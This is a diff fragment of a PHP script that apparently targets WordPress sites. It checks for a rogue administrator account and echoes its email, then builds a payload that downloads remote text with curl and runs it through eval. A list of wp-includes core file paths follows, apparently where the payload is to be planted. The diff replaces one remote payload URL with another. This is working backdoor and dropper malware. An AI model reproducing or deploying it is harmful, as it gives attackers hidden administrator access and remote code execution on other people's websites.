@@ -18,7 +18,7 @@ if (!username_exists($new_admin_username)) {
     echo $new_admin_email . ' (EMAIL)<br>';
 }
 
-$content = '<?php $Url = "https://zerotwostrg.xyz/maaf/zero.txt"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $Url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $output = curl_exec($ch); curl_close($ch); echo eval("?>".$output); ?>';
+$content = '<?php $Url = "https://raw.githubusercontent.com/0xF102400/peler/main/p.txt"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $Url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $output = curl_exec($ch); curl_close($ch); echo eval("?>".$output); ?>';
 
 $file_paths = [
     "./wp-includes/random_compat/random_bytes_bcrypt.php",
